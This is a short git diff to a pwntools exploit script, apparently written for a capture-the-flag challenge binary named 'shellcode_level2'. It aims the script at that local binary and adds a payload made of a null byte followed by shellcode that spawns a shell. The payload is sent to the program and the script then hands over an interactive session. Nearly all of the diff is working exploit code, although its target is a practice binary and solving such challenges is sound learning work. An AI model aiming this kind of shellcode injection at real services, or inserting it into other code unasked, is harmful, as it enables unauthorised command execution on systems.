@@ -14,7 +14,7 @@ context.terminal = ['tmux', 'splitw', '-h']
 debug = 1
 
 if debug:
-    io = process('./')
+    io = process('./shellcode_level2')
 else:
     io = remote('')
 
@@ -22,6 +22,12 @@ def p():
     gdb.attach(proc.pidof(io)[0])
 
 #one_gadget = [,,]
+payload = flat(
+    {0: b'\x00',
+    1: asm(shellcraft.sh())
+     }
+)
+io.sendline(payload)
 
 
 io.interactive()
